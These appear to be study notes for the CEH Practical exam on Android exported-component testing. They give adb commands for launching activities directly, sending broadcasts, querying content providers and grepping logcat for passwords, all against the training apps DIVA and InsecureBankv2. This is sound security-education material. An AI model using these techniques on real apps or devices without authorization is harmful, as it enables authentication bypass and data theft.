# Android Hacking Phase 3 — Exported Component Exploitation (CEH Practical Notes)

## Objective

Learn how to exploit Android exported components using:

- ADB Activity Manager (`am`)
    
- intents
    
- broadcasts
    
- content providers
    
- exported activities
    
- IPC abuse
    

These are CORE Android pentesting skills used in:

- CEH Practical
    
- mobile pentesting
    
- Android bug bounty
    
- mobile malware analysis
    

Android components communicate using intents and IPC mechanisms. Exported components can be invoked externally if improperly protected. ([Android Developers](https://developer.android.com/guide/topics/intents/intents-filters.html?utm_source=chatgpt.com "Intents and intent filters  |  App architecture  |  Android Developers"))

---

# 1. Android IPC Components

|Component|Purpose|
|---|---|
|Activity|UI screens|
|Service|Background operations|
|Broadcast Receiver|Receives broadcasts|
|Content Provider|Shares structured data|

---

# 2. Important Android Pentesting Concept

## Exported Components

Dangerous setting:

```xml
android:exported="true"
```

Meaning:

- external apps can access component
    
- ADB can invoke component
    
- attack surface exposed
    

---

# 3. Activity Manager (`am`)

ADB uses Activity Manager to:

- start activities
    
- send broadcasts
    
- invoke services
    
- pass intents
    

Official Android documentation explains that `am` is used for starting activities and sending intents. ([emanual.github.io](https://emanual.github.io/Android-docs/tools/help/adb.html?utm_source=chatgpt.com "Android Debug Bridge | Android Developers"))

---

# 4. Launch Exported Activities

## Syntax

```bash
adb shell am start -n <package>/<activity>
```

---

# Example — Launch DIVA HardcodeActivity

```bash
adb shell am start -n jakhar.aseem.diva/.HardcodeActivity
```

---

# Example — Launch SQLInjectionActivity

```bash
adb shell am start -n jakhar.aseem.diva/.SQLInjectionActivity
```

---

# Example — Launch AccessControl Activity

```bash
adb shell am start -n jakhar.aseem.diva/.AccessControl1Activity
```

ADB can directly start exported activities using `am start -n`. ([Stack Overflow](https://stackoverflow.com/questions/13380590/is-it-possible-to-start-activity-through-adb-shell/36346945?utm_source=chatgpt.com "android - Is it possible to start activity through adb shell? - Stack Overflow"))

---

# 5. Authentication Bypass Testing

If sensitive activity launches WITHOUT login:

→ Possible authorization bypass.

Example:

```bash
adb shell am start -n com.android.insecurebankv2/.PostLogin
```

---

# Launch Banking Activities Directly

```bash
adb shell am start -n com.android.insecurebankv2/.DoTransfer
```

```bash
adb shell am start -n com.android.insecurebankv2/.ViewStatement
```

---

# 6. Launch Activities Using Intent Actions

Activities may expose intent filters.

Example from manifest:

```xml
<intent-filter>
    <action android:name="jakhar.aseem.diva.action.VIEW_CREDS"/>
</intent-filter>
```

---

# Trigger Using Action

```bash
adb shell am start -a jakhar.aseem.diva.action.VIEW_CREDS
```

Intent filters allow external triggering of activities using actions. ([Android Developers](https://developer.android.com/guide/topics/intents/intents-filters.html?utm_source=chatgpt.com "Intents and intent filters  |  App architecture  |  Android Developers"))

---

# 7. Send Broadcasts

## Syntax

```bash
adb shell am broadcast -a <ACTION>
```

---

# Example

```bash
adb shell am broadcast -a theBroadcast
```

Expected:

```text
Broadcast completed: result=0
```

Broadcast receivers can be externally triggered if exported. ([VulnTech](https://vulntech.com/tutorial/tutorial/android-pentesting/activities-services-and-intents/?utm_source=chatgpt.com "VulnTech Activities, Services & Intents – VulnTech Notes"))

---

# 8. Content Provider Exploitation

Content Providers expose structured data.

Common attack:

- unauthorized database access
    
- SQL injection
    
- information disclosure
    

---

# Query Content Provider

## Syntax

```bash
adb shell content query --uri <URI>
```

---

# Example

```bash
adb shell content query --uri content://jakhar.aseem.diva.provider.notesprovider/notes
```

The Android `content` command allows querying content providers directly from ADB. ([Stack Overflow](https://stackoverflow.com/questions/27988069/query-android-content-provider-from-command-line-adb-shell?utm_source=chatgpt.com "Query Android content provider from command line (adb shell) - Stack Overflow"))

---

# 9. Provider Enumeration

If query fails:

```text
Unknown URI
```

Possible causes:

- wrong path
    
- incorrect authority
    
- invalid table URI
    

---

# Find Valid Paths in JADX

Search:

```text
UriMatcher
```

OR:

```text
addURI
```

Example:

```java
uriMatcher.addURI(AUTHORITY, "notes", 1);
```

This reveals:

```text
/notes
```

---

# 10. Logcat Monitoring

## View Logs

```bash
adb logcat
```

---

# Filter Logs

VERY IMPORTANT.

```bash
adb logcat | grep diva
```

OR:

```bash
adb logcat | grep -i password
```

---

# Common Findings in Logs

|Vulnerability|Example|
|---|---|
|credentials in logs|usernames/passwords|
|tokens|API keys|
|stack traces|debug info|
|SQL errors|injectable queries|

---

# 11. Intent Extras Injection

ADB can send custom extras.

## Example

```bash
adb shell am start -n com.app/.Activity --es username admin
```

---

# Common Extra Types

|Flag|Type|
|---|---|
|`--es`|string|
|`--ei`|integer|
|`--ez`|boolean|
|`--el`|long|

ADB supports passing extras inside intents. ([ubaierbhat](https://ubaierbhat.com/blog/2020/01/26/launch-activity-directly?utm_source=chatgpt.com "Launching an activity directly with adb | ubaierbhat"))

---

# 12. Deep Link Exploitation

## Example

```bash
adb shell am start -a android.intent.action.VIEW -d "app://notes"
```

Deep links are common Android attack surfaces.

---

# 13. Common Android IPC Vulnerabilities

|Vulnerability|Description|
|---|---|
|exported activity abuse|auth bypass|
|broadcast injection|malicious broadcasts|
|insecure providers|data theft|
|intent spoofing|unauthorized actions|
|deep link abuse|unintended navigation|
|missing permissions|unrestricted access|

---

# 14. Important ADB Commands

## Start Activity

```bash
adb shell am start -n package/.Activity
```

---

## Start Using Action

```bash
adb shell am start -a ACTION_NAME
```

---

## Send Broadcast

```bash
adb shell am broadcast -a ACTION_NAME
```

---

## Query Provider

```bash
adb shell content query --uri content://authority/path
```

---

## Filter Logs

```bash
adb logcat | grep keyword
```

---

# 15. Real Workflow

|Static Analysis|Dynamic Exploitation|
|---|---|
|manifest analysis|activity launching|
|JADX review|provider attacks|
|find intent filters|broadcast injection|
|find exported components|runtime abuse|

This is REAL Android pentesting methodology.

---

# 16. CEH Practical Relevance

These skills are commonly useful for:

- Android app exploitation
    
- exported component testing
    
- IPC abuse
    
- auth bypass
    
- content provider exploitation
    
- mobile bug bounty
    

---

# 17. Vulnerable Apps Used

## Damn Insecure and Vulnerable App (DIVA)

Used for:

- IPC exploitation
    
- provider attacks
    
- auth bypass
    
- intent abuse
    

---

## InsecureBankv2

Used for:

- exported activity exploitation
    
- banking app testing
    
- insecure IPC
    
- mobile auth bypass
    

---

# 18. Phase 3 Summary

You learned:

✅ Exported component exploitation  
✅ Activity launching  
✅ Intent abuse  
✅ Broadcast injection  
✅ Content provider attacks  
✅ Logcat analysis  
✅ IPC exploitation  
✅ Authorization bypass testing  
✅ Intent extras injection  
✅ Deep link testing

---

# Next Phase

# Phase 4 — Burp Suite Mobile Traffic Interception

Topics:

- Android proxy setup
    
- HTTPS interception
    
- Burp certificate installation
    
- API traffic analysis
    
- request modification
    
- mobile backend testing
    

Android IPC and intent handling are documented in official Android developer documentation. ([Android Developers](https://developer.android.com/guide/topics/intents/intents-filters.html?utm_source=chatgpt.com "Intents and intent filters  |  App architecture  |  Android Developers"))